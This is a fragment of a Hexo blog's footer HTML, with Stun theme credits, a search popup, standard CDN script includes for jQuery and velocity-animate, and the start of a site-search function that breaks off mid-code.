fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.json';
 
